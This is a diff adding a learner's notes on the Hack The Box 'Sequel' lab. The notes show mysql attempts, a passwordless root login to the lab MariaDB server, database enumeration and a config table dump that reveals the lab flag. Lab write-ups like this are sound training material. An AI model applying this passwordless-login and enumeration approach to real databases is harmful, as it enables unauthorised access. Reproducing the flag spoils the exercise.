@@ -40,6 +40,93 @@ Nmap done: 1 IP address (1 host up) scanned in 203.11 seconds
 note the addtion of -sC in the arugments for nmap. this has provided the answer for Task 3 - Version: 5.5.5-10.3.27-MariaDB-0+deb10u1
 
 
+to connect to DB the following was tried with the result:
+mysql 10.129.60.74 -u root
+ERROR 2002 (HY000): Can't connect to local server through socket '/run/mysqld/mysqld.sock' (2)
+
+mysql -u root 10.129.60.74
+ERROR 2002 (HY000): Can't connect to local server through socket '/run/mysqld/mysqld.sock' (2)
+
+mysql -D 10.129.60.74 -u root
+ERROR 2002 (HY000): Can't connect to local server through socket '/run/mysqld/mysqld.sock' (2)
+
+mysql -h 10.129.60.74 -u root
+ERROR 2002 (HY000): Can't connect to server on '10.129.60.74' (115)
+
+mysql -h http://10.129.60.74 -u root
+ERROR 2059 (HY000): Plugin http could not be loaded: /usr/lib/aarch64-linux-gnu/libmariadb3/plugin/http.so: cannot open shared object file: No such file or directory
+
+
+reset the machine and used the following:
+10.129.22.144
+
+https://mariadb.com/kb/en/show-tables/
+
+
+Following commands used in mariaDB
+----------------------------------
+
+MariaDB [(none)]> show databases;
++--------------------+
+| Database           |
++--------------------+
+| htb                |
+| information_schema |
+| mysql              |
+| performance_schema |
++--------------------+
+4 rows in set (0.025 sec)
+
+
+MariaDB [(none)]> show tables in htb;
++---------------+
+| Tables_in_htb |
++---------------+
+| config        |
+| users         |
++---------------+
+2 rows in set (0.078 sec)
+
+
+MariaDB [(none)]> use htb;
+# prompt changes to 
+MariaDB [htb]>
+
+MariaDB [htb]> show tables;
++---------------+
+| Tables_in_htb |
++---------------+
+| config        |
+| users         |
++---------------+
+2 rows in set (0.022 sec)
+
+MariaDB [htb]> select * from config;
++----+-----------------------+----------------------------------+
+| id | name                  | value                            |
++----+-----------------------+----------------------------------+
+|  1 | timeout               | 60s                              |
+|  2 | security              | default                          |
+|  3 | auto_logon            | false                            |
+|  4 | max_size              | 2M                               |
+|  5 | flag                  | 7b4bec00d1a39e3dd4e021ec3d915da8 |
+|  6 | enable_uploads        | false                            |
+|  7 | authentication_method | radius                           |
++----+-----------------------+----------------------------------+
+7 rows in set (0.022 sec)
+
+
+the steps for the above were taken from :
+https://www.mytechonit.com/post/hack-the-box-sequel
+
+
+
+
+
+
+
+
+
 
 TASK 1
 
